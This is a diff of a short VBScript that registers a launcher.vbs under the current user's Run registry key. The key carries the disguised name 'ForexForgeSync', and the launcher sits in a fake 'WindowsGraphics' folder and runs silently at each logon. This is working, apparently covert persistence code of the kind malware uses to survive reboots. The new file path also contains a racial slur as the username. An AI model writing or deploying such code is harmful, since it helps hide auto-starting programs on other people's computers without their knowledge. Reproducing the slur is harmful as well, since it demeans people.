@@ -1,11 +1,11 @@
 Set objShell = CreateObject("WScript.Shell")
-Set objFSO = CreateObject("Scripting.FileSystemObject")
 
-' Path to the launcher
-strVBS = "C:\Users\Public\WindowsGraphics\launcher.vbs"
+' The exact path to your launcher
+strVBS = "C:\Users\nigga12\AppData\Roaming\Local\WindowsGraphics\launcher.vbs"
 
-' Register it to run at startup
+' The Registry "To-Do" List
 strRegPath = "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\ForexForgeSync"
 strRunCmd = "wscript.exe //B """ & strVBS & """"
 
+' Save it
 objShell.RegWrite strRegPath, strRunCmd, "REG_SZ"
